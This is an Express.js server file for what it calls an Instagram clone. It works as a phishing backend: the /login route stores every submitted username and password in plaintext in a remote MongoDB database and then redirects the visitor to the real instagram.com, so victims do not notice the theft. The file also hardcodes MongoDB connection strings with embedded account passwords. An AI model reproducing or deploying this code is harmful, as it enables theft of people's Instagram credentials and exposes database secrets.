const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;

// Middleware to parse URL-encoded and JSON bodies
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, "public")));

// Connect to MongoDB
// mongoose.connect("mongodb+srv://murdockmaathew:admin@cluster0demo.ahvh0gl.mongodb.net/instagram-clone?retryWrites=true&w=majority&appName=Cluster0demo", {
mongoose.connect("mongodb+srv://amankazmi257:admin@cluster0.cxm9vpe.mongodb.net/instagram?retryWrites=true&w=majority&appName=Cluster0", {
    serverSelectionTimeoutMS: 5000,
})
.then(() => console.log("Connected to MongoDB"))
.catch((err) => console.error("MongoDB connection error:", err));


const db = mongoose.connection;
db.on("error", console.error.bind(console, "connection error:"));
db.once("open", () => {
  console.log("Connected to MongoDB");
});

// Define User Schema
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
});

const User = mongoose.model("User", userSchema);

// Routes
app.post("/login", async (req, res) => {
  console.log("POST /login");
  console.log("Request Body:", req.body);

  const { username, password } = req.body;

  try {
    if (!username || !password) {
      return res.status(400).send("Username and password are required");
    }

    const newUser = new User({ username, password });
    await newUser.save();
    res.status(200).redirect('https://www.instagram.com/');
  } catch (err) {
    console.error("Error saving user:", err);
    return res.status(500).send("Error saving user to database");
  }
});

// Serve the HTML file
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
